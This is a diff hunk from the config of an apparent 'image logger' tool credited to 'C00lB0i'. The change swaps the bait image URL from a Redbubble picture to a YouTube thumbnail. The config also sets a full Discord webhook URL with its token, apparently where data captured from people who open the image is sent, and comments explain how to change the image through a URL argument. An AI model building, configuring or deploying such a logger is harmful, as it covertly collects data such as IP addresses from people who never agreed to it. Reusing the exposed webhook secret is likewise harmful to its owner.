@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1487121493145161860/Bfs6fvJzFZP0X3dyXcZMf5FnuaeNJCx3G7_BhkpAKPi-rHgjE4IGklT5-tIgZpCbdJ4X",
-    "image": "https://ih1.redbubble.net/image.3252508092.1463/sss,small,product,750x1000.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.ytimg.com/an_webp/AUHxNU_F7ws/mqdefault_6s.webp?du=3000&sqp=CMjRms4G&rs=AOn4CLCWO2w7fTMHaMS9SiXzShg2yMM3Xw", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
